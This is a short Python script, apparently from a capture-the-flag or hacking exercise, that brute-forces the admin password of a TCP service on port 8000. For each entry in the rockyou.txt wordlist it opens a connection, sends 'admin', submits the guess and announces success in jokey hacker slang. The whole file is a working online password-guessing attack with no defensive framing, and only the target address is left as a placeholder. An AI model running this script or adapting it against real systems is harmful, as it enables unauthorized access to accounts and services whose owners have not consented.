import socket
password_wordlist = "/usr/share/wordlists/rockyou.txt"
host = <IP_Address>  
port = 8000 
def fuzz_password(password_wordlist):
               

    try:
        with open(password_wordlist, 'r') as file:
            for password in file:
                # Clean it up
                password = password.strip()

                # Establish our connection to the server
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))

                    # Send the "admin" command so we can prompt for password
                    s.sendall(b'admin\n')

                    # Receive the password prompt
                    response = s.recv(1024).decode().strip()

                    if "password" in response.lower():
                        s.sendall((password + '\n').encode())

                        # Receive the response after entering the password
                        response = s.recv(1024).decode().strip()

                        # Check if the password is correct or if it's still asking
                        if "password:" in response.lower():
                            continue
                        else:
                            print(f"🥶 Congrates 1337 h4ck3r {password}")
                            break
            else:
                print(f"No password prompt")
    except FileNotFoundError:
        print(f"Yoo u using file that aint existing!")
    except Exception as e:
        print(f"an error occured {e}")

fuzz_password(password_wordlist)